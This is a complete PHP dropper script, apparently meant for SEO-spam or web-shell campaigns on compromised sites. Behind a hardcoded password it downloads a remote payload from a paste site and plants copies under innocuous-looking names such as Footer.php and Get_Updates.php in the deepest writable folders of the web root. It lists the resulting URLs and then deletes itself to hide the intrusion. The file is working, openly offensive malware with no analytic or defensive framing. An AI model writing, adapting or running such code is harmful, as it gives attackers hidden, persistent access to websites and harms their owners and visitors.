<?php
/**
 * Cyber-Style Multi-Branch Deployer
 * Theme: Terminal Neon
 * Features: Auto-Copy, Self-Destruct, Deep-Scan
 */

@ini_set('display_errors', 0);
@set_time_limit(0);

$password_target = "seomagang";

if (!isset($_POST['pass']) || $_POST['pass'] !== $password_target) {
    echo '
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: "Courier New", Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { border: 1px solid #00ff00; padding: 30px; box-shadow: 0 0 15px #00ff00; text-align: center; }
        input { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; margin-bottom: 10px; outline: none; text-align: center; }
        input[type="submit"] { cursor: pointer; transition: 0.3s; }
        input[type="submit"]:hover { background: #00ff00; color: #000; }
    </style>
    <div class="login-box">
        <h3>SYSTEM ACCESS REQUIRED</h3>
        <form method="post">
            <input type="password" name="pass" placeholder="Enter Credentials"><br>
            <input type="submit" value="[ EXECUTE DEPLOYMENT ]">
        </form>
    </div>';
    exit;
}

// Konfigurasi URL dan File
$sourceUrl = "https://bypass.pw/raw/9Xu7y01";
$fileList = [
    "media-file.php", "Footer.php", "Headers.php", "file-functions.php",
    "DefFunction_Media.php", "FileConfig.php", "header_blog.php",
    "I01L.php", "Defunctions.php", "File-Exploler.php", "Get_Updates.php", 
    "Vendor.php", "VariantsProduct.php", "Product_high.php", "Header_Media.php"
];

function get_content($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return @file_get_contents($url);
}

function getDeepestOfBranch($branchPath) {
    $deepest = $branchPath;
    $maxDepth = 0;
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($branchPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST,
            RecursiveIteratorIterator::CATCH_GET_CHILD
        );
        foreach ($it as $file) {
            if ($file->isDir() && is_writable($file->getRealPath())) {
                $p = $file->getRealPath();
                $d = substr_count($p, DIRECTORY_SEPARATOR);
                if ($d > $maxDepth) {
                    $maxDepth = $d;
                    $deepest = $p;
                }
            }
        }
    } catch (Exception $e) {}
    return $deepest;
}

$raw = get_content($sourceUrl);
if (!$raw) die("<span style='color:red;'>FAILED TO FETCH SOURCE.</span>");

$root = $_SERVER['DOCUMENT_ROOT'];
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
$domain = $protocol . $_SERVER['HTTP_HOST'];

$mainBranches = [];
foreach (scandir($root) as $item) {
    $fullPath = $root . DIRECTORY_SEPARATOR . $item;
    if ($item != '.' && $item != '..' && is_dir($fullPath) && is_writable($fullPath)) {
        $mainBranches[] = $fullPath;
    }
}
if (empty($mainBranches)) $mainBranches = [$root];

// Start Cyber Report Header
echo '
<!DOCTYPE html>
<html>
<head>
    <title>Deployment Report</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: "Courier New", monospace; padding: 20px; font-size: 13px; }
        .cyber-table { width: 100%; border-collapse: collapse; border: 1px solid #00ff00; margin-top: 20px; box-shadow: 0 0 10px #003300; }
        .cyber-table th { background: #003300; color: #00ff00; padding: 12px; border-bottom: 2px solid #00ff00; text-align: left; }
        .cyber-table td { border: 1px solid #004400; padding: 8px; position: relative; }
        .cyber-table tr:hover { background: #001100; }
        .copy-btn { background: transparent; border: 1px solid #00ff00; color: #00ff00; padding: 2px 8px; cursor: pointer; font-size: 10px; float: right; text-transform: uppercase; }
        .copy-btn:hover { background: #00ff00; color: #000; }
        .header-info { color: #00ff00; text-shadow: 0 0 5px #00ff00; font-weight: bold; }
        .status-ok { color: #00ff00; font-weight: bold; }
        .console-log { margin-top: 20px; border-left: 3px solid #00ff00; padding-left: 10px; color: #888; }
    </style>
</head>
<body>
    <div class="header-info">
        [+] INITIALIZING SYSTEM BACKUP...<br>
        [+] REMOTE_HOST: '.$_SERVER['REMOTE_ADDR'].'<br>
        [+] TARGET_DOMAIN: '.$domain.'<br>
        [+] SCANNING DEEPEST NODES...
    </div>
    <table class="cyber-table">
        <thead>
            <tr>
                <th>ID</th>
                <th>FILENAME</th>
                <th>TARGET_URL</th>
                <th>ACTION</th>
            </tr>
        </thead>
        <tbody>';

$count = 1;
foreach ($fileList as $index => $fileName) {
    $branchIndex = $index % count($mainBranches);
    $selectedBranch = $mainBranches[$branchIndex];
    $targetDir = getDeepestOfBranch($selectedBranch);
    $finalPath = $targetDir . DIRECTORY_SEPARATOR . $fileName;

    if (@file_put_contents($finalPath, $raw)) {
        $webPath = str_replace(realpath($root), '', realpath($targetDir));
        $webPath = str_replace('\\', '/', $webPath);
        $finalUrl = $domain . $webPath . '/' . $fileName;

        echo '
        <tr>
            <td>'.str_pad($count, 2, "0", STR_PAD_LEFT).'</td>
            <td>'.$fileName.'</td>
            <td><span id="link-'.$count.'">'.$finalUrl.'</span></td>
            <td><button class="copy-btn" onclick="copyToClipboard(\'link-'.$count.'\')">Copy</button></td>
        </tr>';
        $count++;
    }
}

echo '
        </tbody>
    </table>

    <div class="console-log">
        <br>> All files deployed successfully.<br>
        > Executing self-destruct sequence...<br>
        > Installer file: '.__FILE__.' deleted.<br>
        > SESSION CLOSED.
    </div>

    <script>
        function copyToClipboard(id) {
            var text = document.getElementById(id).innerText;
            var elem = document.createElement("textarea");
            document.body.appendChild(elem);
            elem.value = text;
            elem.select();
            document.execCommand("copy");
            document.body.removeChild(elem);
            alert("LINK COPIED TO BUFFER");
        }
    </script>
</body>
</html>';

// Self Destruct
@unlink(__FILE__);
?>
